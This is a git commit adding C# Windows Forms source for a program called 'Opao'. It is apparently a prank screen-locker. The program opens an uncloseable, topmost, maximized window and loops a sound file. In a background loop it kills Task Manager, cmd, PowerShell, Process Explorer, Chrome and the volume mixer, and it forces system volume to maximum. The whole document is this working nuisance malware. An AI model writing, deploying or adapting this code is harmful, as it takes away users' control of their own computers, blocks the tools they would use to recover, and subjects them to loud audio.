8b3e2f30d2cad62e894be28bf30ffdf8d3a2ecde
lupnis <65355238+lupnis@users.noreply.github.com>
2021-02-02 20:02:17 +0800

    Add files via upload

---
+++ Opao/Opao/Form1.Designer.cs
@@ -0,0 +1,76 @@
+﻿namespace Opao
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// 必需的设计器变量。
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// 清理所有正在使用的资源。
+        /// </summary>
+        /// <param name="disposing">如果应释放托管资源，为 true；否则为 false。</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows 窗体设计器生成的代码
+
+        /// <summary>
+        /// 设计器支持所需的方法 - 不要修改
+        /// 使用代码编辑器修改此方法的内容。
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.panel1 = new System.Windows.Forms.Panel();
+            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
+            this.SuspendLayout();
+            // 
+            // panel1
+            // 
+            this.panel1.BackColor = System.Drawing.Color.Violet;
+            this.panel1.Dock = System.Windows.Forms.DockStyle.Left;
+            this.panel1.Location = new System.Drawing.Point(0, 0);
+            this.panel1.Name = "panel1";
+            this.panel1.Size = new System.Drawing.Size(31, 16);
+            this.panel1.TabIndex = 0;
+            // 
+            // backgroundWorker1
+            // 
+            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 12F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(800, 16);
+            this.ControlBox = false;
+            this.Controls.Add(this.panel1);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Form1";
+            this.TopMost = true;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Form1_FormClosing);
+            this.Shown += new System.EventHandler(this.Form1_Shown);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Panel panel1;
+        private System.ComponentModel.BackgroundWorker backgroundWorker1;
+    }
+}
+
---
+++ Opao/Opao/Form1.cs
@@ -0,0 +1,85 @@
+﻿using System;
+using System.ComponentModel;
+using System.Windows.Forms;
+using System.Management;
+using System.Runtime.InteropServices;
+
+namespace Opao
+{
+    public partial class Form1 : Form
+    {
+        [DllImport("winmm.dll")]
+        public static extern long waveOutSetVolume(uint deviceID, uint Volume);
+        [DllImport("winmm.dll")]
+        private static extern bool PlaySound(string pszSound, int hmod, int fdwSound);
+        public const int SND_FILENAME = 0x00020000;
+        public const int SND_ASYNC = 0x0001;
+        public const int SND_LOOP = 8;
+        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, uint wParam, uint lParam);
+        const uint WM_APPCOMMAND = 0x319;
+        const uint APPCOMMAND_VOLUME_UP = 0x0a;
+        const uint APPCOMMAND_VOLUME_DOWN = 0x09;
+        const uint APPCOMMAND_VOLUME_MUTE = 0x08;
+        public Form1()
+        {
+            
+            InitializeComponent();
+            Control.CheckForIllegalCrossThreadCalls = false;
+        }
+
+        private void Form1_Shown(object sender, EventArgs e)
+        {
+            for (int i = 0; i <= 800; i++)
+            {
+                panel1.Width = i;
+                for (int j = 0; j < 1000000; j++) ;
+            }
+            backgroundWorker1.RunWorkerAsync();
+            try
+            {
+                PlaySound("Op.wav", 0, SND_ASYNC | SND_FILENAME | SND_LOOP);
+            }
+            catch
+            {
+            }
+            panel1.Dock = DockStyle.Fill;
+            this.WindowState = FormWindowState.Maximized;
+           
+        }
+
+        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
+        {
+
+            while (true)
+            {
+                for (int i = 0; i < 120000000; i++) ;
+                Console.WriteLine("tick");
+                ManagementObjectCollection objects = new ManagementObjectSearcher("SELECT * FROM Win32_Process").Get();
+                foreach (ManagementObject item in objects)
+                {
+                    if (item["Name"].ToString() == "Taskmgr.exe"|| item["Name"].ToString() == "perfmon.exe"
+                        || item["Name"].ToString() =="cmd.exe"|| item["Name"].ToString() =="powershell.exe"
+                        || item["Name"].ToString() =="ProcessExplorer.exe"|| item["Name"].ToString() =="chrome.exe"
+                        || item["Name"].ToString() == "SndVol.exe")//||item["Name"].ToString()=="explorer.exe")
+                    {
+                        string[] args = new string[] { "0" };
+                        item.InvokeMethod("Terminate", args);
+                        break;
+                    }
+                }
+                for(int k=0;k<=100;k++)
+                {
+                    SendMessage(this.Handle, WM_APPCOMMAND, 0x30292, APPCOMMAND_VOLUME_UP * 0x10000);
+                }
+                
+                waveOutSetVolume(0, 0xFFFF);
+            }
+        }
+
+        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
+        {
+            e.Cancel = true;
+        }
+    }
+}
